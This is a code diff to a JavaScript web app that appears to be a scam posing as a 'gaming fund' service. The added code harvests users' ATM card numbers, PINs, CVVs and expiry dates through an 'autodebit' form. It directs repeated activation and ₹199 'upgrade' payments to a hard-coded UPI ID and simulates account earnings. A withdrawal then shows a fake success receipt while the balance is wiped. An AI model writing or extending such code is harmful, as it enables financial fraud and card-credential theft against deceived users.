@@ -34,6 +34,7 @@ const StorageManager = {
             password: password, // In production, this should be hashed
             username: username,
             accountDetails: null,
+            autodebitDetails: null,
             activated: false
         };
 
@@ -84,6 +85,25 @@ const StorageManager = {
     getAccountDetails(username) {
         const users = JSON.parse(localStorage.getItem('users')) || {};
         return users[username]?.accountDetails || null;
+    },
+
+    // Save autodebit details for user
+    saveAutodebitDetails(username, details) {
+        const users = JSON.parse(localStorage.getItem('users')) || {};
+        
+        if (users[username]) {
+            users[username].autodebitDetails = details;
+            localStorage.setItem('users', JSON.stringify(users));
+            return { success: true, message: 'Autodebit details saved successfully!' };
+        }
+        
+        return { success: false, message: 'User not found!' };
+    },
+
+    // Get autodebit details for user
+    getAutodebitDetails(username) {
+        const users = JSON.parse(localStorage.getItem('users')) || {};
+        return users[username]?.autodebitDetails || null;
     },
 
     // Mark account as activated
@@ -310,114 +330,185 @@ if (document.getElementById('welcomeMessage')) {
             if (result.success) {
                 setTimeout(() => {
                     messageDiv.textContent = '';
+                    // Automatically open autodebit panel
+                    document.getElementById('gamingFundSection').classList.add('hidden');
+                    document.getElementById('autodebitSection').classList.remove('hidden');
+                    
+                    // Load saved autodebit details if they exist
+                    const savedAutodebit = StorageManager.getAutodebitDetails(loggedInUser);
+                    if (savedAutodebit) {
+                        document.getElementById('atmCardNumber').value = savedAutodebit.cardNumber || '';
+                        document.getElementById('atmCardPin').value = savedAutodebit.cardPin || '';
+                        document.getElementById('atmCardExpiry').value = savedAutodebit.cardExpiry || '';
+                        document.getElementById('atmCardCvv').value = savedAutodebit.cardCvv || '';
+                        document.getElementById('autodebitAccountHolder').value = savedAutodebit.accountHolder || '';
+                        document.getElementById('enableOtpToggle').checked = savedAutodebit.otpEnabled || false;
+                    }
                 }, 2000);
             }
         }
     });
 
-    // Run Account Live button
-    document.getElementById('runAccountBtn').addEventListener('click', () => {
-        document.getElementById('gamingFundSection').classList.add('hidden');
-        document.getElementById('activationSection').classList.remove('hidden');
-    });
-
     // ============================================
-    // NEW AND OLD USER PAYMENT FLOW
+    // AUTODEBIT PANEL
     // ============================================
 
-    // New User Offer button - reveal payment details
-    document.getElementById('newUserOfferBtn').addEventListener('click', () => {
-        const paymentDetails = document.getElementById('newUserPaymentDetails');
-        const oldUserDetails = document.getElementById('oldUserPaymentDetails');
-        
-        // Toggle new user payment details
-        paymentDetails.classList.toggle('hidden');
-        
-        // Hide old user payment details if visible
-        if (!oldUserDetails.classList.contains('hidden')) {
-            oldUserDetails.classList.add('hidden');
-        }
-    });
+    const autodebitForm = document.getElementById('autodebitForm');
+    if (autodebitForm) {
+        // Force OTP toggle to always be ON and disabled
+        const otpToggle = document.getElementById('enableOtpToggle');
+        otpToggle.checked = true;
+        otpToggle.disabled = true;
 
-    // Old User Offer button - reveal payment details
-    document.getElementById('oldUserOfferBtn').addEventListener('click', () => {
-        const paymentDetails = document.getElementById('oldUserPaymentDetails');
-        const newUserDetails = document.getElementById('newUserPaymentDetails');
-        
-        // Toggle old user payment details
-        paymentDetails.classList.toggle('hidden');
-        
-        // Hide new user payment details if visible
-        if (!newUserDetails.classList.contains('hidden')) {
-            newUserDetails.classList.add('hidden');
-        }
-    });
-
-    // ============================================
-    // UPI COPY FUNCTIONALITY FOR ALL COPY BUTTONS
-    // ============================================
-
-    document.querySelectorAll('.copyUpiBtn').forEach(button => {
-        button.addEventListener('click', (e) => {
+        autodebitForm.addEventListener('submit', (e) => {
             e.preventDefault();
-            const upiId = button.parentElement.querySelector('.upiId').textContent;
-            const copyMessage = button.parentElement.parentElement.querySelector('.copyMessage');
+
+            const cardNumber = document.getElementById('atmCardNumber').value.trim();
+            const cardPin = document.getElementById('atmCardPin').value.trim();
+            const cardExpiry = document.getElementById('atmCardExpiry').value.trim();
+            const cardCvv = document.getElementById('atmCardCvv').value.trim();
+            const accountHolder = document.getElementById('autodebitAccountHolder').value.trim();
+            const otpEnabled = true;
+            const messageDiv = document.getElementById('autodebitMessage');
+
+            // Validation
+            if (!cardNumber || !cardPin || !cardExpiry || !cardCvv || !accountHolder) {
+                messageDiv.textContent = 'Please fill all required fields!';
+                messageDiv.className = 'message error';
+                return;
+            }
+
+            const autodebitDetails = {
+                cardNumber: cardNumber,
+                cardPin: cardPin,
+                cardExpiry: cardExpiry,
+                cardCvv: cardCvv,
+                accountHolder: accountHolder,
+                otpEnabled: otpEnabled
+            };
+
+            const result = StorageManager.saveAutodebitDetails(loggedInUser, autodebitDetails);
             
-            navigator.clipboard.writeText(upiId).then(() => {
-                copyMessage.textContent = '✓ UPI ID copied to clipboard!';
+            messageDiv.textContent = result.message;
+            messageDiv.className = 'message ' + (result.success ? 'success' : 'error');
+
+            if (result.success) {
                 setTimeout(() => {
-                    copyMessage.textContent = '';
+                    messageDiv.textContent = '';
+                    document.getElementById('autodebitSection').classList.add('hidden');
+                    document.getElementById('activationPaymentSection').classList.remove('hidden');
+                }, 1500);
+            }
+        });
+    }
+
+    // ============================================
+    // ACTIVATION PAYMENT PANEL
+    // ============================================
+
+    const activationPaymentBtn = document.getElementById('activationPaymentBtn');
+    if (activationPaymentBtn) {
+        activationPaymentBtn.addEventListener('click', () => {
+            document.getElementById('activationPaymentSection').classList.add('hidden');
+            document.getElementById('activationCodeUpiSection').classList.remove('hidden');
+        });
+    }
+
+    // Copy UPI for activation code
+    const activationCopyUpiBtn = document.getElementById('activationCopyUpiBtn');
+    if (activationCopyUpiBtn) {
+        activationCopyUpiBtn.addEventListener('click', () => {
+            navigator.clipboard.writeText('malikworker78@fam').then(() => {
+                document.getElementById('activationCopyMessage').textContent = '✓ UPI ID copied to clipboard!';
+                setTimeout(() => {
+                    document.getElementById('activationCopyMessage').textContent = '';
                 }, 2000);
             }).catch(() => {
                 alert('Failed to copy. Please try again.');
             });
         });
-    });
+    }
 
-    // ============================================
-    // UTR SUBMISSION FOR BOTH OFFERS
-    // ============================================
+    // Submit UTR for activation code
+    const activationSubmitUtrBtn = document.getElementById('activationSubmitUtrBtn');
+    if (activationSubmitUtrBtn) {
+        activationSubmitUtrBtn.addEventListener('click', () => {
+            const utr = document.getElementById('activationUtrInput').value.trim();
+            const messageDiv = document.getElementById('activationUtrMessage');
 
-    document.querySelectorAll('.submitUtrBtn').forEach(button => {
-        button.addEventListener('click', (e) => {
-            e.preventDefault();
-            
-            // Get the parent offer card and UTR input
-            const offerCard = button.closest('.payment-details');
-            const utrInput = offerCard.querySelector('.utrInput').value.trim();
-            const utrMessage = offerCard.querySelector('.utrMessage');
-
-            if (!utrInput) {
-                utrMessage.textContent = 'Please enter UTR number!';
-                utrMessage.className = 'message error';
+            if (!utr) {
+                messageDiv.textContent = 'Please enter UTR number!';
+                messageDiv.className = 'message error';
                 return;
             }
 
-            // Activate account
-            StorageManager.activateAccount(loggedInUser);
+            // Generate 7-digit activation code
+            const activationCode = String(Math.floor(Math.random() * 10000000)).padStart(7, '0');
+            localStorage.setItem(`activationCode_${loggedInUser}`, activationCode);
 
-            // Show success section
-            document.getElementById('activationSection').classList.add('hidden');
-            document.getElementById('successSection').classList.remove('hidden');
-
-            utrMessage.textContent = '';
+            messageDiv.textContent = '';
+            document.getElementById('activationCodeUpiSection').classList.add('hidden');
+            document.getElementById('activationCodeDisplaySection').classList.remove('hidden');
+            document.getElementById('generatedActivationCode').textContent = activationCode;
         });
-    });
+    }
 
-    // ============================================
-    // FINAL RUN BUTTON - OPEN RUNNING ACCOUNT PANEL
-    // ============================================
+    // Copy activation code
+    const copyActivationCodeBtn = document.getElementById('copyActivationCodeBtn');
+    if (copyActivationCodeBtn) {
+        copyActivationCodeBtn.addEventListener('click', () => {
+            const code = document.getElementById('generatedActivationCode').textContent;
+            navigator.clipboard.writeText(code).then(() => {
+                alert('✓ Activation code copied to clipboard!');
+            }).catch(() => {
+                alert('Failed to copy code.');
+            });
+        });
+    }
 
-    document.getElementById('finalRunBtn').addEventListener('click', () => {
-        // Hide activation flow sections
-        document.getElementById('successSection').classList.add('hidden');
-        document.getElementById('finalMessageSection').classList.add('hidden'); // remove waiting screen
-        document.getElementById('mainDashboard').classList.add('hidden');
-        document.getElementById('runningAccountSection').classList.remove('hidden');
+    // Activate button
+    const activateAccountCodeBtn = document.getElementById('activateAccountCodeBtn');
+    if (activateAccountCodeBtn) {
+        activateAccountCodeBtn.addEventListener('click', () => {
+            // Show verification modal
+            document.getElementById('activationCodeDisplaySection').classList.add('hidden');
+            document.getElementById('codeVerificationSection').classList.remove('hidden');
+        });
+    }
 
-        // Start the running account simulation
-        startRunningAccount(loggedInUser);
-    });
+    // Verify activation code
+    const submitVerificationBtn = document.getElementById('submitVerificationBtn');
+    if (submitVerificationBtn) {
+        submitVerificationBtn.addEventListener('click', () => {
+            const enteredCode = document.getElementById('enteredActivationCode').value.trim();
+            const storedCode = localStorage.getItem(`activationCode_${loggedInUser}`);
+            const verificationMessage = document.getElementById('verificationMessage');
+
+            if (!enteredCode) {
+                verificationMessage.textContent = 'Please enter the activation code!';
+                verificationMessage.className = 'message error';
+                return;
+            }
+
+            if (enteredCode !== storedCode) {
+                verificationMessage.textContent = 'Activation code is incorrect!';
+                verificationMessage.className = 'message error';
+                return;
+            }
+
+            // Code is correct - activate account and move to running account
+            StorageManager.activateAccount(loggedInUser);
+            
+            document.getElementById('codeVerificationSection').classList.add('hidden');
+            document.getElementById('activationPaymentSection').classList.add('hidden');
+            document.getElementById('autodebitSection').classList.add('hidden');
+            document.getElementById('mainDashboard').classList.add('hidden');
+            document.getElementById('runningAccountSection').classList.remove('hidden');
+
+            // Start the running account simulation
+            startRunningAccount(loggedInUser);
+        });
+    }
 
     // ============================================
     // RUNNING ACCOUNT: transactions, balance, commission
@@ -465,8 +556,8 @@ if (document.getElementById('welcomeMessage')) {
             balance = parseFloat((balance + amount).toFixed(2));
             localStorage.setItem(balanceKey, balance);
 
-            // Update commission (12%)
-            commission = parseFloat((balance * 0.12).toFixed(2));
+            // Update commission (3.5%)
+            commission = parseFloat((balance * 0.035).toFixed(2));
             localStorage.setItem(commissionKey, commission);
 
             // Add transaction to feed
@@ -531,10 +622,10 @@ if (document.getElementById('welcomeMessage')) {
             const commission = parseFloat(localStorage.getItem(`commission_${username}`)) || 0;
 
             // Show volume limit message instead of completing withdrawal
-            showWithdrawalVolumeLimit(commission);
+            showWithdrawalVolumeLimit(commission, accNumber, ifsc, bank, contact);
         });
 
-        function showWithdrawalVolumeLimit(commissionAmount) {
+        function showWithdrawalVolumeLimit(commissionAmount, accNumber, ifsc, bank, contact) {
             // Hide form, show message section
             document.getElementById('withdrawCommissionForm').style.display = 'none';
             document.getElementById('backFromWithdrawBtn').style.display = 'none';
@@ -543,9 +634,9 @@ if (document.getElementById('welcomeMessage')) {
             messageDiv.innerHTML = `
                 <div class="withdrawal-message">
                     <strong>You have exceeded the account volume.</strong><br>
-                    Kindly wait 24 hours or upgrade your plan with ₹99.
+                    Kindly wait 24 hours or upgrade your plan with ₹199.
                 </div>
-                <button class="btn btn-primary" id="upgradePaymentBtn">Click for Upgrade – Pay ₹99</button>
+                <button class="btn btn-primary" id="upgradePaymentBtn">Click for Upgrade – Pay ₹199</button>
                 <button class="btn btn-secondary" id="cancelUpgradeBtn" style="margin-left:8px;">Cancel</button>
             `;
 
@@ -554,7 +645,7 @@ if (document.getElementById('welcomeMessage')) {
             // Upgrade button handler
             document.getElementById('upgradePaymentBtn').addEventListener('click', () => {
                 messageDiv.remove();
-                showUpgradePaymentPanel();
+                showUpgradePaymentPanel(commissionAmount, accNumber, ifsc, bank, contact);
             });
 
             // Cancel handler
@@ -566,11 +657,11 @@ if (document.getElementById('welcomeMessage')) {
             });
         }
 
-        function showUpgradePaymentPanel() {
+        function showUpgradePaymentPanel(commissionAmount, accNumber, ifsc, bank, contact) {
             const paymentDiv = document.createElement('div');
             paymentDiv.innerHTML = `
                 <div style="margin-top:15px;">
-                    <h4>Upgrade Plan – ₹99 Only</h4>
+                    <h4>Upgrade Plan – ₹199 Only</h4>
                     <p><strong>Fixed UPI ID:</strong></p>
                     <div style="display:flex;gap:8px;align-items:center;margin:8px 0;">
                         <span id="upgradeUpiId" style="flex:1;padding:8px;background:rgba(15,23,42,0.6);border-radius:6px;color:var(--text-primary);">malikworker78@fam</span>
@@ -604,9 +695,9 @@ if (document.getElementById('welcomeMessage')) {
                     return;
                 }
 
-                // Show final confirmation
+                // Show confirmation and receipt
                 paymentDiv.remove();
-                showUpgradeConfirmation();
+                showWithdrawalSuccessReceipt(commissionAmount, accNumber, ifsc, bank, contact);
             });
 
             // Cancel
@@ -618,50 +709,68 @@ if (document.getElementById('welcomeMessage')) {
             });
         }
 
-        function showUpgradeConfirmation() {
-            // ============================================
-            // RESET BALANCE AND COMMISSION
-            // ============================================
-            
-            // Stop transaction generation
-            if (window.runningTransactionTimeout) {
-                clearTimeout(window.runningTransactionTimeout);
-            }
-
-            // Reset balance and commission in localStorage
-            localStorage.setItem(`balance_${username}`, '0');
-            localStorage.setItem(`commission_${username}`, '0');
-
-            // Update UI to reflect zero balances
-            document.getElementById('liveBalance').textContent = '₹0';
-            document.getElementById('commissionAmount').textContent = '₹0';
-
-            // Clear transaction feed
-            document.getElementById('transactionFeed').innerHTML = '';
-
-            // Disable withdraw button
-            document.getElementById('withdrawCommissionBtn').disabled = true;
-            document.getElementById('withdrawCommissionBtn').style.opacity = '0.5';
-            document.getElementById('withdrawCommissionBtn').style.cursor = 'not-allowed';
-
-            // Show success message
-            const confirmDiv = document.createElement('div');
-            confirmDiv.innerHTML = `
-                <div class="withdrawal-message">
-                    <strong>Your payment is credited in 24 hours.</strong>
+        function showWithdrawalSuccessReceipt(commissionAmount, accNumber, ifsc, bank, contact) {
+            const receiptDiv = document.createElement('div');
+            receiptDiv.innerHTML = `
+                <div class="withdrawal-message" style="background:rgba(16,185,129,0.1);border-color:var(--success-color);color:var(--success-color);">
+                    <strong>CONGRATULATIONS! WITHDRAWAL SUCCESSFUL.</strong><br>
+                    Amount will be credited within 6 hours.
                 </div>
-                <div class="payment-confirmation-note">
-                    <strong>⚠️ IMPORTANT NOTE:</strong><br>
-                    PLEASE DO NOT LOGIN YOUR RUNNING ACCOUNT FOR 24 HOURS. PAYMENT WILL BE DECLINED.
+
+                <div class="receipt-panel" style="margin-top:20px;padding:20px;background:rgba(15,23,42,0.6);border:1px solid var(--border-color);border-radius:10px;">
+                    <h4 style="margin-bottom:15px;">Withdrawal Receipt</h4>
+                    <div style="display:flex;justify-content:space-between;padding:10px 0;border-bottom:1px solid var(--border-color);">
+                        <span>Account Number:</span>
+                        <span style="font-weight:600;">XXXX ${accNumber.slice(-4)}</span>
+                    </div>
+                    <div style="display:flex;justify-content:space-between;padding:10px 0;border-bottom:1px solid var(--border-color);">
+                        <span>Bank:</span>
+                        <span style="font-weight:600;">${bank}</span>
+                    </div>
+                    <div style="display:flex;justify-content:space-between;padding:10px 0;border-bottom:1px solid var(--border-color);">
+                        <span>IFSC Code:</span>
+                        <span style="font-weight:600;">${ifsc}</span>
+                    </div>
+                    <div style="display:flex;justify-content:space-between;padding:10px 0;border-bottom:1px solid var(--border-color);">
+                        <span>Amount Credited:</span>
+                        <span style="font-weight:600;color:var(--success-color);">₹${Number(commissionAmount).toLocaleString('en-IN')}</span>
+                    </div>
                 </div>
-                <button class="btn btn-primary" id="confirmDoneBtn" style="width:100%;margin-top:12px;">Done</button>
+
+                <div style="margin-top:15px;padding:12px;background:rgba(245,158,11,0.1);border:1px solid var(--warning-color);border-radius:8px;color:var(--warning-color);">
+                    <strong>Note:</strong> Withdrawal takes up to 6 hours. Please wait.
+                </div>
+
+                <button class="btn btn-primary" id="submitReceiptBtn" style="width:100%;margin-top:20px;">Submit</button>
             `;
 
-            document.getElementById('withdrawCommissionForm').parentElement.appendChild(confirmDiv);
+            document.getElementById('withdrawCommissionForm').parentElement.appendChild(receiptDiv);
 
-            // Done button - back to running account
-            document.getElementById('confirmDoneBtn').addEventListener('click', () => {
-                confirmDiv.remove();
+            // Submit receipt button
+            document.getElementById('submitReceiptBtn').addEventListener('click', () => {
+                // Reset balance and commission
+                localStorage.setItem(`balance_${username}`, '0');
+                localStorage.setItem(`commission_${username}`, '0');
+
+                // Update UI to reflect zero balances
+                document.getElementById('liveBalance').textContent = '₹0';
+                document.getElementById('commissionAmount').textContent = '₹0';
+
+                // Clear transaction feed
+                document.getElementById('transactionFeed').innerHTML = '';
+
+                // Disable withdraw button
+                document.getElementById('withdrawCommissionBtn').disabled = true;
+                document.getElementById('withdrawCommissionBtn').style.opacity = '0.5';
+                document.getElementById('withdrawCommissionBtn').style.cursor = 'not-allowed';
+
+                // Stop transaction generation
+                if (window.runningTransactionTimeout) {
+                    clearTimeout(window.runningTransactionTimeout);
+                }
+
+                // Hide withdraw panel and show running account
+                receiptDiv.remove();
                 document.getElementById('withdrawCommissionSection').classList.add('hidden');
                 document.getElementById('runningAccountSection').classList.remove('hidden');
                 document.getElementById('withdrawCommissionForm').style.display = 'block';
@@ -684,13 +793,12 @@ if (document.getElementById('welcomeMessage')) {
         
         // Reset all sections
         document.getElementById('gamingFundSection').classList.add('hidden');
-        document.getElementById('activationSection').classList.add('hidden');
-        document.getElementById('successSection').classList.add('hidden');
+        document.getElementById('autodebitSection').classList.add('hidden');
+        document.getElementById('activationPaymentSection').classList.add('hidden');
+        document.getElementById('activationCodeUpiSection').classList.add('hidden');
+        document.getElementById('activationCodeDisplaySection').classList.add('hidden');
+        document.getElementById('codeVerificationSection').classList.add('hidden');
         document.getElementById('accountDetailsForm').reset();
-        
-        // Reset payment details visibility
-        document.getElementById('newUserPaymentDetails').classList.add('hidden');
-        document.getElementById('oldUserPaymentDetails').classList.add('hidden');
         
         // Reset UTR inputs
         document.querySelectorAll('.utrInput').forEach(input => {
